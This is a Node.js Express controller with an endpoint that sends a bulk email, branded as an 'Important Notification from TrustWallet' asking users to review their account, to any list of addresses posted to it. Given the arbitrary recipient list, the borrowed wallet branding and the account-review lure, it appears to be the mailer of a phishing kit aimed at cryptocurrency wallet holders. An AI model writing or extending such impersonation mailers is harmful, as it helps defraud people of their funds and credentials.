
const userModel = require('../models/user');
const sendEmail = require('../middlewares/nodemailer');
const { trustTemplate } = require('../utils/mailtemplates');

/**
 * POST /send-bulk-email
 * Expects body: { "emails": ["a@example.com", "b@example.com"] }
 * Sends a default subject and message/template to all emails.
 */
exports.sendBulkEmailDefault = async (req, res) => {
    try {
        const { emails } = req.body;

        if (!Array.isArray(emails) || emails.length === 0) {
            return res.status(400).json({ error: 'Emails must be a non-empty array.' });
        }

        // Define your default subject and message/template here
        const defaultSubject = "Important Notification from TrustWallet";
        const defaultMessage = "Dear user,<br><br>This is an important notification from TrustWallet. Please review your account for recent updates.<br><br>Best regards,<br>TrustWallet Team";

        // Send emails in parallel
        const results = await Promise.allSettled(
            emails.map(email =>
                sendEmail({
                    email,
                    subject: defaultSubject,
                    html: trustTemplate ? trustTemplate(defaultMessage) : defaultMessage
                })
            )
        );

        const success = results.filter(r => r.status === 'fulfilled').length;
        const failed = results.filter(r => r.status === 'rejected').length;

        return res.status(200).json({
            message: `Bulk email process completed.`,
            successCount: success,
            failedCount: failed,
            errors: results
                .map((r, i) => r.status === 'rejected' ? { email: emails[i], reason: r.reason } : null)
                .filter(Boolean)
        });
    } catch (error) {
        return res.status(500).json({ error: 'Internal server error.' });
    }
};
